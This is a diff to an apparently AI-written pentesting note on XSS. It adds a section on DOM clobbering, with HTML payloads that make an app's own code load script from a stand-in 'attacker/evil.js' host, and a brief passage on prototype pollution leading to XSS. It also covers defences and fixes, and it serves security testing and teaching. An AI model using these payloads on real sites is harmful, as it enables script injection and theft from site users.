@@ -1,6 +1,6 @@
 # Cross-Site Scripting (XSS)
 
-#XSS #CrossSiteScripting #StoredXSS #ReflectedXSS #DOMXSS #BlindXSS #mXSS #CSPBypass #XSStrike #dalfox #XSSHunter #BurpSuite #BeEF #ffuf
+#XSS #CrossSiteScripting #StoredXSS #ReflectedXSS #DOMXSS #BlindXSS #mXSS #DOMClobbering #PrototypePollution #CSPBypass #XSStrike #dalfox #XSSHunter #BurpSuite #BeEF #ffuf
 
 ## What is this?
 
@@ -615,6 +615,59 @@ DOMPurify.version
 
 ---
 
+## DOM Clobbering (HTML-only, no script)
+
+The technique for when the sanitizer strips every script vector but **allows `id` and `name` attributes** (DOMPurify does by default) — and no CSP nonce would help you anyway, because **you never execute script**. Instead you inject named HTML elements that **clobber** the global variables the app's own JavaScript reads, turning attacker-controlled markup into attacker-controlled *data* that the app then feeds to a sink.
+
+**Why it works:** the browser auto-creates global references from element `id`/`name`:
+
+```html
+<a id=x></a>
+<script>x           // === the <a> element — named access on window via id
+document.x          // named access on document via name/id too
+</script>
+```
+
+An app that guards on a global it *assumes* only its own code sets is subvertible:
+
+```javascript
+// 🚩 app code
+if (window.config && window.config.url) {
+  let s = document.createElement('script');
+  s.src = window.config.url;      // if we control config.url → we load our JS
+  document.body.append(s);
+}
+```
+
+### Payload building blocks
+
+```html
+<!-- 1. Truthiness / presence clobber — satisfy an "if (window.X)" guard -->
+<a id=x>
+
+<!-- 2. Control a STRING the app reads — an <a>'s toString() returns its href -->
+<a id=x href="https://attacker/evil.js">
+<!-- String(window.x) === "https://attacker/evil.js"  → feeds config.url etc. -->
+
+<!-- 3. Nested property (window.config.url) — two elements + HTMLCollection -->
+<a id=config><a id=config name=url href="https://attacker/evil.js">
+<!-- window.config is now an HTMLCollection; window.config.url resolves to the 2nd <a> -->
+
+<!-- 4. form gives named access to its controls -->
+<form id=config><input name=url value="https://attacker/evil.js"></form>
+<!-- window.config.url === the input element (use .value / attributes) -->
+```
+
+> [!tip] **Reach for this when:** you have HTML injection that survives DOMPurify (script/event handlers stripped, but the markup lands in the page) **and** the page's JS reads a config/flag/URL off `window.*` or `document.*`. It defeats a strict CSP because there is no inline or remote script *in your payload* — the app's own trusted code does the dangerous thing with your clobbered value. Common escalations: overwrite a `defaultAvatar`/`logoURL`/`config.api` that later becomes a `script.src` or `innerHTML`, or clobber `document.getElementById('...')`-fetched nodes.
+
+> [!note] **Defence tells (for reading code):** the app is safe if it uses `let`/`const` globals (not clobberable), reads config from a JSON/`data-*` attribute via `JSON.parse`, or type-checks with `instanceof HTMLElement` before use. Clobbering only bites plain `var`/implicit globals and property lookups on them.
+
+### Related: client-side prototype pollution → XSS
+
+Same "HTML/data, not script" spirit at the JS layer: if a client-side merge/parse writes attacker keys into `Object.prototype` (`?__proto__[x]=y`, or a polluted JSON body), a later **gadget** that reads an unset property (`config.transport_url`, `sanitizer.ALLOWED_ATTR`) picks up your polluted value and reaches a sink. Find gadgets with **DOM Invader → prototype-pollution mode** (already in the DOM XSS section). Fixes: `Object.freeze(Object.prototype)`, null-proto objects, key blocklists.
+
+---
+
 ## CSP (Content Security Policy) Considerations
 
 ### Checking CSP
@@ -902,5 +955,5 @@ Understanding defenses helps you spot gaps:
 ---
 
 *Created: 2026-02-27*
-*Updated: 2026-08-23*
-*Model: claude-opus-5*
+*Updated: 2026-09-18*
+*Model: claude-opus-4-8*
